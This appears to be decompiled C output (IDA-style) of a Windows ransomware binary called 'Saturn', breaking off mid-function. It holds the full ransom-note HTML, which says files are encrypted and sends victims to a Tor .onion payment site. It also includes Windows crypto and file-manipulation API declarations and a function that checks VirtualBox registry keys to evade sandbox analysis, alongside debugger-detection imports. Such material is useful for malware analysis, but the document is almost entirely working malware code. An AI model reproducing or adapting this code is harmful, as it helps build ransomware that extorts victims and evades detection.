// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern void (__stdcall *BuildExplicitAccessWithNameA)(PEXPLICIT_ACCESS_A pExplicitAccess, LPSTR pTrusteeName, DWORD AccessPermissions, ACCESS_MODE AccessMode, DWORD Inheritance);
// extern DWORD (__stdcall *SetEntriesInAclA)(ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_A pListOfExplicitEntries, PACL OldAcl, PACL *NewAcl);
// extern LSTATUS (__stdcall *RegCreateKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern DWORD (__stdcall *SetSecurityInfo)(HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern LSTATUS (__stdcall *RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern BOOL (__stdcall *CryptAcquireContextA)(HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *CryptEncrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);
// extern BOOL (__stdcall *CryptCreateHash)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
// extern BOOL (__stdcall *CryptDeriveKey)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY *phKey);
// extern BOOL (__stdcall *CryptHashData)(HCRYPTHASH hHash, const BYTE *pbData, DWORD dwDataLen, DWORD dwFlags);
// extern BOOL (__stdcall *CryptDestroyHash)(HCRYPTHASH hHash);
// extern BOOL (__stdcall *CryptStringToBinaryA)(LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
// extern BOOL (__stdcall *CryptImportPublicKeyInfo)(HCRYPTPROV hCryptProv, DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, HCRYPTKEY *phKey);
// extern BOOL (__stdcall *CryptDecodeObjectEx)(DWORD dwCertEncodingType, LPCSTR lpszStructType, const BYTE *pbEncoded, DWORD cbEncoded, DWORD dwFlags, PCRYPT_DECODE_PARA pDecodePara, void *pvStructInfo, DWORD *pcbStructInfo);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern BOOL (__stdcall *InitializeCriticalSectionEx)(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount, DWORD Flags);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern BOOL (__stdcall *GetVolumeInformationA)(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern SIZE_T (__stdcall *HeapSize)(HANDLE hHeap, DWORD dwFlags, LPCVOID lpMem);
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern BOOL (__stdcall *IsDebuggerPresent)();
// extern BOOL (__stdcall *CheckRemoteDebuggerPresent)(HANDLE hProcess, PBOOL pbDebuggerPresent);
// extern DWORD (__stdcall *GetLogicalDriveStringsA)(DWORD nBufferLength, LPSTR lpBuffer);
// extern BOOL (__stdcall *SetFileAttributesA)(LPCSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *MoveFileExA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, DWORD dwFlags);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName);
// extern BOOL (__stdcall *MoveFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// extern HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetLastError)();
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern DWORD (__stdcall *GetFileAttributesA)(LPCSTR lpFileName);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern int (__stdcall *LCMapStringW)(LCID Locale, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern void (__stdcall *OutputDebugStringW)(LPCWSTR lpOutputString);
// extern BOOL (__stdcall *SHGetSpecialFolderPathA)(HWND hwnd, LPSTR pszPath, int csidl, BOOL fCreate);
// extern BOOL (__stdcall *ShellExecuteExA)(SHELLEXECUTEINFOA *pExecInfo);
// extern HINSTANCE (__stdcall *ShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
// extern BOOL (__stdcall *SystemParametersInfoA)(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni);
// extern HRESULT (__stdcall *CoCreateInstance)(const IID *const rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, const IID *const riid, LPVOID *ppv);
// extern HRESULT (__stdcall *CoInitialize)(LPVOID pvReserved);
const IID riid = { 136430u, 0u, 0u, { 192u, 0u, 0u, 0u, 0u, 0u, 0u, 70u } }; // idb
_UNKNOWN unk_435310; // weak
const IID rclsid = { 136193u, 0u, 0u, { 192u, 0u, 0u, 0u, 0u, 0u, 0u, 70u } }; // idb
void *std::exception::`vftable' = &sub_403A70; // weak
void *std::bad_alloc::`vftable' = &unknown_libname_7; // weak
void *std::logic_error::`vftable' = &unknown_libname_7; // weak
void *std::length_error::`vftable' = &unknown_libname_7; // weak
void *std::out_of_range::`vftable' = &unknown_libname_7; // weak
void *std::runtime_error::`vftable' = &sub_403A70; // weak
void *std::_System_error::`vftable' = &sub_404220; // weak
void *std::system_error::`vftable' = &sub_404220; // weak
void *std::_Facet_base::`vftable' = &sub_403CF0; // weak
char *const Mode = &unk_43541C; // idb
int dword_435448[] = { 1 }; // weak
int dword_43544C[14] = { 2, 18, 10, 33, 34, 50, 42, 3, 19, 11, 35, 51, 43, 0 }; // weak
void *std::ctype<char>::`vftable' = &sub_403F00; // weak
void *std::_Iostream_error_category::`vftable' = &sub_4042E0; // weak
void *std::ios_base::failure::`vftable' = &sub_404220; // weak
void *std::ios_base::`vftable' = &sub_404590; // weak
void *std::streambuf::`vftable' = &sub_40B1D0; // weak
void *std::filebuf::`vftable' = &sub_40AF80; // weak
void *std::ios::`vftable' = &sub_40B260; // weak
void *std::ostream::`vftable' = &sub_40CF4D; // weak
void *std::codecvt<char,char,_Mbstatet>::`vftable' = &sub_40BD20; // weak
void *std::num_put<char,std::ostreambuf_iterator<char>>::`vftable' = &sub_40BD20; // weak
void *std::numpunct<char>::`vftable' = &sub_4108A0; // weak
void *type_info::`vftable' = &sub_414B06; // weak
void *std::bad_array_new_length::`vftable' = &unknown_libname_7; // weak
_UNKNOWN unk_438660; // weak
void *std::bad_exception::`vftable' = &unknown_libname_7; // weak
char *off_43A6A8[44] =
{
  "No error",
  "Operation not permitted",
  "No such file or directory",
  "No such process",
  "Interrupted function call",
  "Input/output error",
  "No such device or address",
  "Arg list too long",
  "Exec format error",
  "Bad file descriptor",
  "No child processes",
  "Resource temporarily unavailable",
  "Not enough space",
  "Permission denied",
  "Bad address",
  "Unknown error",
  "Resource device",
  "File exists",
  "Improper link",
  "No such device",
  "Not a directory",
  "Is a directory",
  "Invalid argument",
  "Too many open files in system",
  "Too many open files",
  "Inappropriate I/O control operation",
  "Unknown error",
  "File too large",
  "No space left on device",
  "Invalid seek",
  "Read-only file system",
  "Too many links",
  "Broken pipe",
  "Domain error",
  "Result too large",
  "Unknown error",
  "Resource deadlock avoided",
  "Unknown error",
  "Filename too long",
  "No locks available",
  "Function not implemented",
  "Directory not empty",
  "Illegal byte sequence",
  "Unknown error"
}; // weak
_UNKNOWN unk_43B428; // weak
_UNKNOWN unk_43B430; // weak
_UNKNOWN unk_43B448; // weak
_UNKNOWN unk_43B474; // weak
_UNKNOWN unk_43B490; // weak
_UNKNOWN unk_43B498; // weak
_UNKNOWN unk_43B4B4; // weak
const char Locale[4] = { '\0', '\0', '\0', '\0' }; // idb
char BASE64_table_441970[] = { 'A' }; // weak
_UNKNOWN unk_442324; // weak
void *std::ofstream::`vftable' = &sub_40CF65; // weak
void *std::iostream::`vftable' = &sub_40CF6D; // weak
void *std::fstream::`vftable' = &sub_40CF75; // weak
_UNKNOWN unk_442344; // weak
void *std::istream::`vftable' = &sub_40CF5D; // weak
_UNKNOWN unk_442354; // weak
_UNKNOWN unk_44235C; // weak
void *std::ifstream::`vftable' = &sub_40CF55; // weak
_UNKNOWN unk_44236C; // weak
void *std::stringbuf::`vftable' = &sub_40F4A0; // weak
void *std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vftable' = &sub_411259; // weak
int SHA512_Constants_4427B8[] = { 1116352408 }; // weak
int SHA512_Constants_4428B8[] = { -685199838 }; // weak
int SHA512_Constants_4428BC[] = { 1116352408 }; // weak
__int128 xmmword_442B40 = 0x43565151544450534D4E4E4250474E43i64; // weak
const _ThrowInfo _TI2_AVbad_alloc_std__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVbad_alloc_std__ }; // idb
const _ThrowInfo _TI3_AVlength_error_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVlength_error_std__ }; // idb
const _ThrowInfo _TI3_AVout_of_range_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVout_of_range_std__ }; // idb
const _ThrowInfo _TI3_AVbad_array_new_length_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVbad_array_new_length_std__ }; // idb
const _ThrowInfo _TI2_AVruntime_error_std__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVruntime_error_std__ }; // idb
const _ThrowInfo _TI5_AVfailure_ios_base_std__ = { 0u, &unknown_libname_1, NULL, &_CTA5_AVfailure_ios_base_std__ }; // idb
int dword_447000 = -1; // weak
int dword_447084 = 1; // weak
wchar_t *off_4471E0 = L"         (((((                  H"; // weak
int dword_4472DC = -2; // weak
HANDLE hConsoleOutput = (HANDLE)0xFFFFFFFE; // idb
char aHtmlTitleSATUR[984] = "<html>\r\n<title>S A T U R N</title>\r\n<center>\r\n <body>\r\n <h1>S A T U R N</h1>\r\n <h4>Your documents, photos, databases, and other important files have been encrypted!</h4>\r\n <br /> To Decrypt your files follow these instructions:\r\n <br />\r\n  <div>\r\n <h4>1. Download and Install Tor Browser from <a href=https://www.torproject.org/>https://www.torproject.org/</a></h4>\r\n <br />\r\n <h4>2. Run the browser</h4>\r\n <br />\r\n  <h4>3. In the Tor Browser, open website:</h3>\r\n  <div style=\"background-color: #d9d9d9; margin-left: 20px; margin-right: 20px; padding-bottom: 8px; padding-left: 8px; padding-right: 8px; padding-top: 8px;\">\r\n</a><b>http://su34pwhpcafeiztt.onion</b><br/>\r\n</div> \r\n <h4>4. Follow the instructions at this website</h4>\r\n </div>\r\n </body>\r\n</center>\r\n</html>\r\n<style>\r\n html {\r\n background-color: white;\r\n font-family: Helvetica, sans-serif;\r\n }\r\n \r\n div {\r\n background-color: #f2f2f2;\r\n width: 80: %;\r\n padding: 25px;\r\n margin: 25px;\r\n overflow:hidden;\r\n }\r\n</style>\r\n"; // weak
_UNKNOWN unk_447D88; // weak
char aHtmlTitleSATUR_0[984] = "<html>\r\n<title>S A T U R N</title>\r\n<center>\r\n <body>\r\n <h1>S A T U R N</h1>\r\n <h4>Your documents, photos, databases, and other important files have been encrypted!</h4>\r\n <br /> To Decrypt your files follow these instructions:\r\n <br />\r\n  <div>\r\n <h4>1. Download and Install Tor Browser from <a href=https://www.torproject.org/>https://www.torproject.org/</a></h4>\r\n <br />\r\n <h4>2. Run the browser</h4>\r\n <br />\r\n  <h4>3. In the Tor Browser, open website:</h3>\r\n  <div style=\"background-color: #d9d9d9; margin-left: 20px; margin-right: 20px; padding-bottom: 8px; padding-left: 8px; padding-right: 8px; padding-top: 8px;\">\r\n</a><b>http://su34pwhpcafeiztt.onion</b><br/>\r\n</div> \r\n <h4>4. Follow the instructions at this website</h4>\r\n </div>\r\n </body>\r\n</center>\r\n</html>\r\n<style>\r\n html {\r\n background-color: white;\r\n font-family: Helvetica, sans-serif;\r\n }\r\n \r\n div {\r\n background-color: #f2f2f2;\r\n width: 80: %;\r\n padding: 25px;\r\n margin: 25px;\r\n overflow:hidden;\r\n }\r\n</style>\r\n"; // weak
void *Src = NULL; // idb
int dword_452150 = 0; // weak
int dword_452154 = 15; // weak
void *dword_452158 = NULL; // idb
int dword_452168 = 0; // weak
int dword_45216C = 15; // weak
void *dword_452170 = NULL; // idb
int dword_452180 = 0; // weak
int dword_452184 = 15; // weak
char asc_452188[2] = "€"; // weak
_UNKNOWN unk_452858; // weak
struct _RTL_CRITICAL_SECTION stru_452860 = { NULL, 0, 0, NULL, NULL, 0u }; // idb
std::_Fac_node *dword_452920 = NULL; // idb
int dword_452924 = 0; // weak
int dword_45292C = 0; // weak
int dword_452940 = 0; // idb
_DWORD dword_452944 = 0; // weak
_UNKNOWN unk_45294C; // weak
_UNKNOWN unk_452988; // weak
_UNKNOWN unk_452989; // weak
int dword_452990[5] = { 0, 0, 0, 0, 0 }; // weak
_UNKNOWN unk_4529A4; // weak
int dword_4529E0[22] = { 0, 0, 0, 0, 0, 0, 0, 0,  }; // weak
int dword_452B00; // weak
int dword_452B04; // weak
int dword_452B08; // weak
int dword_452B0C; // weak
_UNKNOWN unk_452B20; // weak
_UNKNOWN unk_452B21; // weak
int dword_452F14; // weak
union _SLIST_HEADER ListHead; // idb
_UNKNOWN unk_452F28; // weak
_UNKNOWN unk_452F30; // weak
int dword_453014; // weak
int dword_453028; // weak
int dword_45318C; // weak
int dword_45339C; // weak
int dword_4533A0; // weak
void *dword_4533A4; // idb
void *dword_4533A8; // idb
_onexit_table_t stru_4533AC; // idb
int dword_4533C4; // weak
int dword_4533C8; // weak
int dword_4533D0; // weak
int dword_4533D4; // weak
int dword_4533D8; // weak
struct __crt_locale_data *dword_4533DC; // idb
LPCRITICAL_SECTION lpCriticalSection[128]; // weak
int dword_4536C0; // weak
HANDLE hHeap; // idb
int dword_4536E8; // weak
int dword_4536EC; // weak
int dword_4536F0; // weak
int dword_4536F4; // weak
struct __crt_multibyte_data *dword_4537C0; // idb
int dword_4537E4; // weak
_UNKNOWN unk_4537F0; // weak
int dword_4537F8; // weak
_UNKNOWN unk_4537FC; // weak
int dword_453804; // weak
int dword_453808; // weak
_UNKNOWN dword_45380C; // weak
int dword_453810; // weak
int dword_453814; // weak
char byte_453818; // weak
int dword_45381C; // weak
int dword_453820; // weak
void *dword_453824; // idb
int dword_453828; // weak
void *Block; // idb
int dword_453830; // weak
void *dword_453834; // idb
int dword_453838; // weak
void *dword_45383C; // idb
int dword_453840; // weak
void *dword_453844; // idb
int dword_453848; // weak
void *dword_45384C; // idb
int dword_453850; // weak
void *dword_453854; // idb
int dword_453858; // weak
void *dword_45385C; // idb
int dword_453860; // weak
int dword_453864; // idb
int dword_453868; // idb
int dword_45386C; // idb
_UNKNOWN unk_453870; // weak
_UNKNOWN unk_453874; // weak


//----- (00401000) --------------------------------------------------------
int sub_401000()
{
  Block = sub_401E10();
  return atexit(sub_434650);
}

//----- (00401020) --------------------------------------------------------
int sub_401020()
{
  dword_453824 = sub_401E10();
  return atexit(sub_4346D0);
}

//----- (00401040) --------------------------------------------------------
int sub_401040()
{
  dword_45383C = sub_401E10();
  return atexit(sub_434750);
}

//----- (00401060) --------------------------------------------------------
int sub_401060()
{
  dword_453834 = sub_401E10();
  return atexit(sub_4347D0);
}

//----- (00401080) --------------------------------------------------------
int sub_401080()
{
  return atexit(sub_434850);
}

//----- (00401090) --------------------------------------------------------
int sub_401090()
{
  dword_45384C = sub_401E10();
  return atexit(sub_4348C0);
}

//----- (004010B0) --------------------------------------------------------
int sub_4010B0()
{
  dword_453844 = sub_401E10();
  return atexit(sub_434940);
}

//----- (004010D0) --------------------------------------------------------
int sub_4010D0()
{
  sub_401D10((char **)&dword_452170, "abcdefghijklmnopqrstuvwxyz", 0x1Au);
  return atexit(sub_4349C0);
}

//----- (004010F0) --------------------------------------------------------
int sub_4010F0()
{
  sub_401D10((char **)&dword_452158, "ABCDEFGHIJKLMNOPQRSTUVWXYZ", 0x1Au);
  return atexit(sub_434A30);
}

//----- (00401110) --------------------------------------------------------
int sub_401110()
{
  dword_45385C = sub_401E10();
  return atexit(sub_434AA0);
}

//----- (00401130) --------------------------------------------------------
int sub_401130()
{
  dword_453854 = sub_401E10();
  return atexit(sub_434B20);
}

//----- (00401146) --------------------------------------------------------
int sub_401146()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_452858);
  return atexit(sub_434BA0);
}

//----- (0040115C) --------------------------------------------------------
int sub_40115C()
{
  return atexit(sub_434BAA);
}

//----- (00401168) --------------------------------------------------------
int sub_401168()
{
  return atexit(sub_434BB4);
}

//----- (00401174) --------------------------------------------------------
int sub_401174()
{
  sub_40BC40(dword_452990, (int)dword_4529E0, 0, 1);
  return atexit(sub_434BBE);
}
// 452990: using guessed type int dword_452990[5];
// 4529E0: using guessed type int dword_4529E0[22];

//----- (004011CD) --------------------------------------------------------
void *sub_4011CD()
{
  int *v0; // edx

  v0 = dword_452990;
  dword_452B04 = (int)dword_452990;
  if ( dword_452B00 )
  {
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_452B00 + 4) + dword_452B00 + 60) = dword_452990;
    v0 = (int *)dword_452B04;
  }
  if ( dword_452B08 )
  {
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_452B08 + 4) + dword_452B08 + 60) = v0;
    v0 = (int *)dword_452B04;
  }
  if ( dword_452B0C )
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_452B0C + 4) + dword_452B0C + 60) = v0;
  return &unk_452989;
}
// 452990: using guessed type int dword_452990[5];
// 452B00: using guessed type int dword_452B00;
// 452B04: using guessed type int dword_452B04;
// 452B08: using guessed type int dword_452B08;
// 452B0C: using guessed type int dword_452B0C;

//----- (004011D7) --------------------------------------------------------
int sub_4011D7()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_452988);
  return atexit(sub_434BD2);
}

//----- (004011ED) --------------------------------------------------------
int sub_4011ED()
{
  return atexit(sub_434BDC);
}

//----- (004011F9) --------------------------------------------------------
int sub_4011F9()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_452B20);
  return atexit(sub_434BE6);
}

//----- (0040120F) --------------------------------------------------------
int sub_40120F()
{
  sub_41591D((int)&unk_452F30);
  return atexit(sub_434BF0);
}

//----- (00401230) --------------------------------------------------------
char sub_401230()
{
  unsigned int i; // esi
  const CHAR *v1; // eax
  int v3; // [esp+0h] [ebp-A4h] BYREF
  HKEY phkResult; // [esp+14h] [ebp-90h] BYREF
  _QWORD SubKey[2]; // [esp+18h] [ebp-8Ch] BYREF
  int v6; // [esp+28h] [ebp-7Ch]
  int v7; // [esp+2Ch] [ebp-78h]
  char *v8[6]; // [esp+30h] [ebp-74h] BYREF
  char *v9[6]; // [esp+48h] [ebp-5Ch] BYREF
  char *v10[6]; // [esp+60h] [ebp-44h] BYREF
  char *v11[8]; // [esp+78h] [ebp-2Ch] BYREF
  int v12; // [esp+A0h] [ebp-4h]

  v11[7] = (char *)&v3;
  v6 = 0;
  v7 = 15;
  LOBYTE(SubKey[0]) = 0;
  sub_401D10((char **)SubKey, "SYSTEM\\ControlSet001\\Services\\VBoxGuest", 0x27u);
  v12 = 0;
  v8[4] = 0;
  v8[5] = (char *)15;
  LOBYTE(v8[0]) = 0;
  sub_401D10(v8, "SYSTEM\\ControlSet001\\Services\\VBoxMouse", 0x27u);
  LOBYTE(v12) = 1;
  v9[4] = 0;
  v9[5] = (char *)15;
  LOBYTE(v9[0]) = 0;
  sub_401D10(v9, "SYSTEM\\ControlSet001\\Services\\VBoxService", 0x29u);
  LOBYTE(v12) = 2;
  v10[4] = 0;
  v10[5] = (char *)15;
  LOBYTE(v10[0]) = 0;
  sub_401D10(v10, "SYSTEM\\ControlSet001\\Services\\VBoxSF", 0x24u);
  LOBYTE(v12) = 3;
  v11[4] = 0;
  v11[5] = (char *)15;
  LOBYTE(v11[0]) = 0;
  sub_401D10(v11, "SYSTEM\\ControlSet001\\Services\\VBoxVideo", 0x27u);
  v12 = 5;
  for ( i = 0; i < 5; ++i )
  {
    v1 = (const CHAR *)&SubKey[3 * i];
    if ( (unsigned int)v8[6 * i - 1] >= 0x10 )
      v1 = *(const CHAR **)v1;
    phkResult = 0;
    if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, v1, 0, 0x20019u, &phkResult) )
    {
      v12 = -1;
      `eh vector destructor iterator'(SubKey, 0x18u, 5u, (void (__thiscall *)(void *))sub_401970);
      return 1;
    }
  }
  v12 = -1;
  `eh vector destructor iterator'(SubKey, 0x18u, 5u, (void (__thiscall *)(void *))sub_401970);
  return 0;
}

//----- (004013F0) --------------------------------------------------------
char *__fastcall sub_4013F0(char *Src, const char *a2)
{
  unsigned int i; // esi
  char v6; // [esp+14h] [ebp-14h]

  *((_DWORD *)Src + 4) = 0;
  *((_DWORD *)Src + 5) = 15;
  *Src = 0;
  for ( i = 0; i < strlen(a2); ++i )
  {
    v6 = tolower(a2[i]);
    sub_401B40(Src, v6);
  }
  return Src;
}

//----- (004014B0) --------------------------------------------------------
bool __cdecl sub_4014B0(
        CHAR *lpSubKey,
        int a2,
        int a3,
        int a4,
        int a5,
        unsigned int a6,
        CHAR *lpValueName,
        int a8,
        int a9,
        int a10,
        int a11,
        unsigned int a12,
        char *Block,
        int a14,
        int a15,
        int a16,
        int a17,
        unsigned int a18,
        char *a19,
        int a20,
        int a21,
        int a22,
        int a23,
        unsigned int a24)
{
  bool v24; // bl
  const CHAR *p_lpSubKey; // eax
  BYTE *v26; // eax
  const CHAR *p_lpValueName; // ecx
  char *v28; // edi
  const char *v29; // esi
  char *p_Block; // eax
  char *v31; // ecx
  char *v32; // eax
  char *v33; // ecx
  int v34; // ecx
  CHAR *v35; // ecx
  unsigned int v36; // eax
  CHAR *v37; // ecx
  unsigned int v38; // eax
  char *v39; // ecx
  unsigned int v40; // eax
  char *v41; // ecx
  unsigned int v42; // eax
  DWORD cbData; // [esp+14h] [ebp-34h] BYREF
  HKEY phkResult; // [esp+18h] [ebp-30h] BYREF
  void *Buf[4]; // [esp+1Ch] [ebp-2Ch] BYREF
  unsigned int v47; // [esp+2Ch] [ebp-1Ch]
  unsigned int v48; // [esp+30h] [ebp-18h]
  DWORD Type[5]; // [esp+34h] [ebp-14h] BYREF

  Type[4] = 3;
  v24 = 0;
  phkResult = 0;
  p_lpSubKey = (const CHAR *)&lpSubKey;
  if ( a6 >= 0x10 )
    p_lpSubKey = lpSubKey;
  if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, p_lpSubKey, 0, 0x20019u, &phkResult) )
  {
    Type[0] = 0;
    cbData = 256;
    v26 = (BYTE *)LocalAlloc(0x40u, 0x10Au);
    p_lpValueName = (const CHAR *)&lpValueName;
    v28 = (char *)v26;
    if ( a12 >= 0x10 )
      p_lpValueName = lpValueName;
    if ( !RegQueryValueExA(phkResult, p_lpValueName, 0, Type, v26, &cbData) )
    {
      if ( sub_401F20((int *)&Block, (int)Locale) )
      {
        v24 = 1;
      }
      else if ( sub_401F20((int *)&a19, (int)Locale) )
      {
        sub_4013F0((char *)Buf, v28);
        if ( Type[0] == 1 || Type[0] == 7 )
          v24 = sub_401930((char *)Buf, (int)&Block, v34) != -1;
        sub_401970((char **)Buf);
      }
      else if ( Type[0] == 7 )
      {
        v29 = v28;
        while ( *v29 )
        {
          sub_4013F0((char *)Buf, v29);
          p_Block = (char *)&Block;
          if ( a18 >= 0x10 )
            p_Block = Block;
          v31 = (char *)Buf;
          if ( v48 >= 0x10 )
            v31 = (char *)Buf[0];
          if ( sub_401E30(v31, v47, (int)v31, p_Block, a17) != -1 )
            goto LABEL_21;
          v32 = (char *)&a19;
          if ( a24 >= 0x10 )
            v32 = a19;
          v33 = (char *)Buf;
          if ( v48 >= 0x10 )
            v33 = (char *)Buf[0];
          if ( sub_401E30(v33, v47, (int)v33, v32, a23) != -1 )
LABEL_21:
            v24 = 1;
          v29 += strlen(v29) + 1;
          sub_401970((char **)Buf);
        }
      }
    }
    LocalFree(v28);
    RegCloseKey(phkResult);
  }
  if ( a6 >= 0x10 )
  {
    v35 = lpSubKey;
    if ( a6 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)lpSubKey & 0x1F) != 0 )
        goto LABEL_63;
      v36 = *((_DWORD *)lpSubKey - 1);
      if ( v36 >= (unsigned int)lpSubKey || (unsigned int)&lpSubKey[-v36] < 4 || (unsigned int)&lpSubKey[-v36] > 0x23 )
        goto LABEL_63;
      v35 = (CHAR *)*((_DWORD *)lpSubKey - 1);
    }
    j__free(v35);
  }
  a5 = 0;
  a6 = 15;
  LOBYTE(lpSubKey) = 0;
  if ( a12 >= 0x10 )
  {
    v37 = lpValueName;
    if ( a12 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)lpValueName & 0x1F) != 0 )
        goto LABEL_63;
      v38 = *((_DWORD *)lpValueName - 1);
      if ( v38 >= (unsigned int)lpValueName
        || (unsigned int)&lpValueName[-v38] < 4
        || (unsigned int)&lpValueName[-v38] > 0x23 )
      {
        goto LABEL_63;
      }
      v37 = (CHAR *)*((_DWORD *)lpValueName - 1);
    }
    j__free(v37);
  }
  a11 = 0;
  a12 = 15;
  LOBYTE(lpValueName) = 0;
  if ( a18 >= 0x10 )
  {
    v39 = Block;
    if ( a18 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)Block & 0x1F) != 0 )
        goto LABEL_63;
      v40 = *((_DWORD *)Block - 1);
      if ( v40 >= (unsigned int)Block || (unsigned int)&Block[-v40] < 4 || (unsigned int)&Block[-v40] > 0x23 )
        goto LABEL_63;
      v39 = (char *)*((_DWORD *)Block - 1);
    }
    j__free(v39);
  }
  a17 = 0;
  a18 = 15;
